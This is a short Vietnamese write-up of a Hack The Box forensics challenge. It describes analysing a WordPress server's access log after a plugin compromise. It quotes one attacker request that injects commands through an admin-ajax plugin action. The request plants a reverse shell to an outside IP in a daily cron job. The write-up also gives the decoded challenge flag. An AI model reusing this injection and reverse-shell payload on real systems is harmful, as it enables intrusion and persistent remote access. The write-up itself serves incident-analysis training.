# Description

Vulnerable Season
Halloween season is a very busy season for all of us. Especially for web page administrators. Too many Halloween-themed parties to attend, too many plugins to manage. Unfortunately, our admin didn't update the plugins used by our WordPress site and as a result, we got pwned. Can you help us investigate the incident by analyzing the web server logs?

# Source

- [Source](./access.log)
- [Zip](./forensics_vulnerable_season.zip)

# Solve

- Do không chuyên mảng Forensics nên mình phân tích bằng tay và mắt 😵‍💫.
- Xem qua xem lại mười mấy nghìn dòng thì thấy dòng log này. Payload của hacker đã bị mã hóa đi bằng cách dùng base64 (phân mảnh) sau đó đảo ngược lại.
```log
82.179.92.206 - - [28/Sep/2023:05:21:22 -0400] 
"GET /wordpress/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:echo%20%22sh%20-i%20%3E&%20/dev/tcp/82.179.92.206/7331%200%3E&1%22%20%3E%20/etc/cron.daily/testconnect%20&&%20Nz=Eg1n;az=5bDRuQ;Mz=fXIzTm;Kz=F9nMEx;Oz=7QlRI;Tz=4xZ0Vi;Vz=XzRfdDV;echo%20$Mz$Tz$Vz$az$Kz$Oz|base64%20-d|rev:NULL:NULL HTTP/1.1"
200 512 "-" 
"Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
```

- Mình phân tích và decode thì thu được flag.
```bash
echo fXIzTm4xZ0ViXzRfdDV5bDRuQF9nMEx7QlRI | base64 -d | rev
```

`Flag: HTB{L0g_@n4ly5t_4_bEg1nN3r}`